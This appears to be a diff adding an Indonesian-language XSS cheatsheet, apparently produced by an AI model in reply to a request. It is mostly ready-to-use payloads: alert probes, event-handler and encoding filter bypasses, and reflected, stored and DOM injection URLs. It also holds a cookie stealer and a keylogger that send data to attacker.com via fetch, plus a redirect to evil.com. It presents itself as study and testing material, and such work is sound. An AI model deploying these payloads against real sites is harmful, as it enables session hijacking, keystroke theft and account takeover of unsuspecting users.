@@ -1,0 +1,114 @@
+Baik, berikut **XSS Cheatsheet** dalam format plain text supaya bisa langsung kamu masukkan ke file .txt
+
+---
+
+# XSS CHEATSHEET
+
+1. Konsep Dasar
+
+---
+
+XSS = menyisipkan script (JavaScript) ke input aplikasi yang ditampilkan di browser.
+Jenis utama:
+
+* Reflected XSS → payload muncul langsung di response.
+* Stored XSS → payload disimpan di database lalu ditampilkan.
+* DOM-Based XSS → manipulasi di sisi client (JavaScript DOM).
+
+2. Payload Dasar
+
+---
+
+<script>alert(1)</script>
+
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+
+3. Variasi Payload
+
+---
+
+HTML Injection: <b>Test</b>
+
+<h1>XSS</h1>
+
+Event Handler Injection: <img src=x onerror=alert(document.cookie)> <a href="#" onclick=alert(1)>Click</a>
+
+<body onload=alert(1)>
+
+Bypass filter dengan encoding:
+
+<script>alert&#40;1&#41;</script>
+
+%3Cscript%3Ealert(1)%3C/script%3E
+
+Tanpa <script> tag:
+\<svg/onload=alert(1)>
+
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+4. Reflected XSS via URL
+
+---
+
+[http://target.com/page.php?q=](http://target.com/page.php?q=)<script>alert(1)</script>
+[http://target.com/page.php?q=">](http://target.com/page.php?q=%22>)<img src=x onerror=alert(1)>
+
+5. Stored XSS
+
+---
+
+Disisipkan ke form input (komentar, chat, username):
+
+<script>alert('Stored XSS')</script>
+
+\<img src=x onerror=alert('XSS Stored')>
+
+6. DOM-Based XSS
+
+---
+
+[http://target.com/#](http://target.com/#)\<img src=x onerror=alert('DOM')>
+Periksa source: cari document.write(), innerHTML, eval().
+
+7. Advanced Payloads
+
+---
+
+Cookie Stealing:
+
+<script>fetch('http://attacker.com/?c='+document.cookie)</script>
+
+Keylogger:
+
+<script>
+document.onkeypress = function(e){
+ fetch('http://attacker.com/?key='+e.key);
+}
+</script>
+
+Redirect:
+
+<script>window.location='http://evil.com'</script>
+
+8. Tips & Trik
+
+---
+
+* Gunakan polyglot payload → "><svg onload=alert(1)>
+* Jika <script> diblok, pakai event handler seperti onerror, onmouseover.
+* Jika karakter < > difilter, gunakan encoding (%3C %3E atau < >).
+* Untuk ujian, cukup gunakan alert(1) sebagai bukti exploit.
+
+9. Tools Uji XSS
+
+---
+
+* XSStrike → otomatis cari payload.
+* Burp Suite Intruder → untuk fuzzing input XSS.
+* XSS Hunter → untuk payload custom dan tracking.
+
+---
+
